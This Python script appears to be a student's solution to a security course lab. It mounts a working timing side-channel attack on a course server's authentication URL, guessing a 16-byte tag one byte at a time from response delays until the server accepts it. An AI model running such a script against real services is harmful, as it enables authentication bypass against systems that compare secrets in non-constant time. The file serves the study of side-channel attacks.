import requests
from requests.exceptions import ConnectionError, Timeout
import time
import concurrent.futures
from statistics import median, fmean

#
#   Globals
#

DEBUG: bool = False
BASE_URL: str = "http://dart.cse.kau.se:12345/auth/"
HTTP_MAX_RETRIES: int = 100
HTTP_RETRY_SLEEP_BASE: float = 0.8
HTTP_RETRY_SLEEP_FACTOR: float = 0.75
HTTP_LATENCY_TIMOUT_FACTOR: float = 1.5
HTTP_LATENCY_THRESHOLD_FACTOR: float = 0.1
TEST_SAMPLE_SIZE: int = 4
CONCURRENT_WORKERS: int = 8

# ANSI escape codes for text colors
ANSI_RESET = "\033[0m"
ANSI_BLACK = "\033[30m"
ANSI_RED = "\033[31m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_BLUE = "\033[34m"
ANSI_MAGENTA = "\033[35m"
ANSI_CYAN = "\033[36m"
ANSI_WHITE = "\033[37m"

#
#   Classes
#

class TestResult:
    url: str
    status_code: int
    text: str
    elapsed_time: float

    def __init__(self, url, status_code, text, elapsed_time):
        self.url = url
        self.status_code = status_code
        self.text = text
        self.elapsed_time = elapsed_time

class Auth:
    url: str
    user: str
    delay: float
    latency: float
    tag: list[int]
    tag_max_length: int
    elapsed_time_threshold: float
    sample_size: int
    test_results: list[TestResult]

    def __init__(self, user: str, delay: float, tag: list[int], latency: float):
        self.test_results = []
        self.tag_max_length = 32
        self.sample_size = TEST_SAMPLE_SIZE
        self.latency = latency

        self.user = user
        self.delay = delay
        self.tag = tag

        tag_as_string = self.tag_as_string()
        self.url = f"{BASE_URL}{int(delay)}/{user}/{tag_as_string}"

        self._run()

        # for a in self.test_results:
        #     print(a.elapsed_time)

        if (DEBUG or self.tag_ok() or self.ok()) and (delay != 0):
            color = ANSI_GREEN if self.tag_ok() else ANSI_RESET
            print(f'''{color}0x{tag_as_string}
    Mean/Median time:    {"{:.2f}".format(self.elapsed_time_mean())} / {"{:.2f}".format(self.elapsed_time_median())}
    Thresholds (latency): {"{:.2f}".format(self._threshold_lower())} >< {"{:.2f}".format(self._threshold_upper())} ({"{:.2f}".format(self.latency)})
    Delay (iteration):   {"{:.2f}".format(self.delay)} ({self._tag_length()} out of {self.tag_max_length}){ANSI_RESET}''')

    # If auth is sucessfull return True
    def ok(self) -> bool:
        return any(r.status_code == 200 for r in self.test_results)
    
    def tag_ok(self) -> bool:
        mean: float = self.elapsed_time_mean()
        return mean > self._threshold_lower() and mean < self._threshold_upper()
    
    def elapsed_time_latency(self) -> float:
        time_from_delay: float = 0 if self._tag_length() <= 1 else (self._tag_length() * delay)
        return self.elapsed_time_mean() - time_from_delay

    def _threshold_base(self) -> float:
        return self.delay * float(self._tag_length()) + self.latency

    def _threshold_lower(self) -> float:
        return self._threshold_base() - (self.latency * HTTP_LATENCY_THRESHOLD_FACTOR)
    
    def _threshold_upper(self) -> float:
        return self._threshold_base() + (self.latency * HTTP_LATENCY_THRESHOLD_FACTOR)
    
    def _tag_length(self) -> int:
        return len([item for item in self.tag if isinstance(item, int)])
    
    def tag_as_string(self) -> str:
        string = ""
        # represent as string
        for hex_value in self.tag:
            if not isinstance(hex_value, int):
                hex_value = 0
            hex_value = hex(hex_value) # convert
            hex_value = hex_value[2:] # remove the two first characters which are "0x"
            hex_value = pad_string_with_zero(hex_value, 2)
            string += hex_value
        # pad string and return
        return pad_string_with_zero(string, self.tag_max_length)

    def elapsed_time_mean(self) -> float:
        if self.test_results:
            return fmean([item.elapsed_time for item in self.test_results])
        else:
            return 0.0
        
    def elapsed_time_median(self) -> float:
        if self.test_results:
            return median([item.elapsed_time for item in self.test_results])
        else:
            return 0.0

    def _run(self) -> None:
        for _ in range(self.sample_size):
            result = self._request()
            if result:
                self.test_results.append(result)
    
    def _request(self) -> TestResult:
        timeout: float = self._threshold_lower() + (self.latency * HTTP_LATENCY_TIMOUT_FACTOR)
        if timeout == 0.0:
            timeout = 1337.0
        retried: int = 0

        while retried < HTTP_MAX_RETRIES:
            retry_sleep_time: float = HTTP_RETRY_SLEEP_BASE * HTTP_RETRY_SLEEP_FACTOR * retried
            try:
                start_time = time.time()
                response = requests.get(self.url, timeout=timeout)
                end_time = time.time()
                elapsed_time = (end_time - start_time) * 1000
                return TestResult(self.url, response.status_code, response.text, elapsed_time)
            except ConnectionError as e:
                if DEBUG:
                    print(f"{ANSI_RED}Connection failed {e}{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break
            except Timeout as e:
                print(f"{ANSI_RED}Timeout of {timeout} ms exceeded.{ANSI_RESET}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"{ANSI_RED}Max retries of {HTTP_MAX_RETRIES} exceeded!{ANSI_RESET}")
                    break

        # Failed, maybe there is no network connection
        exit(-1)

#
#   Static functions
#

def pad_string_with_zero(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def full_byte_range_with_prefix(prefix: list[int]) -> list[list[int]]:
    list_of_list = []
    for x in range(256):
        p = prefix.copy()
        p.append(x)
        list_of_list.append(p)
    return list_of_list

def run(user: str, delay: float, tag_prefix: list[int], latency: float) -> str:
    auth_ok: list[Auth] = []
    auth_not_ok: list[Auth] = []

    with concurrent.futures.ThreadPoolExecutor(CONCURRENT_WORKERS) as executor:
        uncompleted_futures = []
        for tag in full_byte_range_with_prefix(tag_prefix):
            uncompleted_futures.append(executor.submit(Auth, user, delay, tag, latency))
        
        for completed_futures in concurrent.futures.as_completed(uncompleted_futures):
            auth_attempt: Auth = completed_futures.result()
            if auth_attempt.ok():
                print(auth_attempt)
                # Completed got status 200 return url
                return auth_attempt.url
            elif auth_attempt.tag_ok():
                # Working tag prefix
                auth_ok.append(auth_attempt)
            else:
                auth_not_ok.append(auth_attempt)

    # Set new latency
    # previuos_latencies: list[float] = [item.elapsed_time_latency() for item in auth_not_ok]
    # next_latency: float = fmean(previuos_latencies) if len(previuos_latencies) > 0 else latency
    next_latency: float = Auth(user, 0, [0x0], 1337).elapsed_time_mean()

    if len(auth_ok) == 1:
        # Continue with next tag prefix
        return run(user, delay, auth_ok[0].tag, next_latency)
    elif len(auth_ok) > 1:
        # Too many ok, run again
        return run(user, delay, tag_prefix, next_latency)
    else:
        # Nothing ok, run again
        return run(user, delay, tag_prefix, next_latency)
#
#   Main
#

if __name__ == "__main__":
    user: str = "oscaande104"
    delay: float = float(100)
    
    latency = Auth(user, 0, [0x0], 1337).elapsed_time_mean()
    if latency > 0:
        if delay > 0:
            print(f"Done!\nurl={run(user, delay, [], latency)}")
        else:
            print("Delay has to be larger than 0.")
    else:
        print("Failed to get base HTTP latency to server, maybe there is not network connection.")